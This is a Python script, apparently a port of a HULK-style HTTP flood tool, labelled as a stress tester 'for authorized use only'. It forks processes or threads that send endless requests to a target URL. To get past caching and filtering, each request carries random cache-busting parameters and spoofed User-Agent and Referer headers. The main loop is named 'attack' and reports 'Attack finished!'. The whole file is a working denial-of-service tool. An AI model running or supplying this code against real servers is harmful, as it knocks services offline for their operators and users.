#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# function : HTTP stress testing / load tool (authorized use only)
# original author: firefoxbug
# updated: Python 3 port

import os
import re
import sys
import time
import signal
import socket
import getopt
import random
import urllib.request
import urllib.error
import threading

url = ""
interval = 30
num_thread = 5


def usage():
    print("""
 usage: python dping.py [-t] [-c] http://www.example.com/
   -h : help
   -t : duration in seconds (default: 30)
   -c : number of threads to create (default: 5)
""")
    sys.exit()


def useragent_list():
    return [
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
    ]


def referer_list(host):
    return [
        "http://www.usatoday.com/search/results?q=",
        "http://engadget.search.aol.com/search?q=",
        "http://" + host + "/",
    ]


def handler(signum, _):
    if signum == signal.SIGALRM:
        print("Time is up!")
        print("Attack finished!")
    sys.exit()


def buildblock(size):
    return "".join(chr(random.randint(65, 90)) for _ in range(size))


def send_packet(host, param_joiner, agents, referers):
    request_url = url + param_joiner + buildblock(random.randint(3, 10)) + "=" + buildblock(random.randint(3, 10))
    req = urllib.request.Request(request_url)
    req.add_header("User-Agent", random.choice(agents))
    req.add_header("Cache-Control", "no-cache")
    req.add_header("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
    req.add_header("Referer", random.choice(referers) + buildblock(random.randint(5, 10)))
    req.add_header("Keep-Alive", str(random.randint(110, 120)))
    req.add_header("Connection", "keep-alive")
    req.add_header("Host", host)
    try:
        urllib.request.urlopen(req)
    except urllib.error.HTTPError:
        pass
    except urllib.error.URLError:
        pass


def attack(host, param_joiner, agents, referers):
    while True:
        send_packet(host, param_joiner, agents, referers)


def parse_parameters(parameters):
    global url, interval, num_thread
    interval = 30
    num_thread = 5
    try:
        opts, args = getopt.getopt(parameters, "ht:c:", ["help"])
        if not args:
            usage()
        url = args[0]
        for opt, arg in opts:
            if opt in ("-h", "--help"):
                usage()
            elif opt in ("-t", "--time"):
                if arg.isdigit():
                    interval = int(arg)
                else:
                    usage()
            elif opt in ("-c", "--count"):
                if arg.isdigit():
                    num_thread = int(arg)
                else:
                    usage()
    except getopt.GetoptError:
        print("getopt error!")
        usage()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        usage()

    parse_parameters(sys.argv[1:])
    print("Debug: threads=%d time=%d url=%s" % (num_thread, interval, url))

    if url.count("/") == 2:
        url = url + "/"

    m = re.search(r"http://([^/]*)/?.*", url)
    try:
        host = m.group(1)
    except AttributeError:
        usage()

    agents = useragent_list()
    referers = referer_list(host)

    if "?" in url:
        param_joiner = "&"
    else:
        param_joiner = "?"

    signal.signal(signal.SIGINT, handler)
    if hasattr(signal, "SIGALRM"):
        signal.signal(signal.SIGALRM, handler)
        signal.alarm(interval)

    for i in range(num_thread):
        if hasattr(os, "fork"):
            newpid = os.fork()
            if newpid == 0:
                attack(host, param_joiner, agents, referers)
        else:
            t = threading.Thread(target=attack, args=(host, param_joiner, agents, referers), daemon=True)
            t.start()

    time.sleep(interval)
    if hasattr(signal, "SIGALRM"):
        signal.alarm(0)
    print("Main thread exiting...")
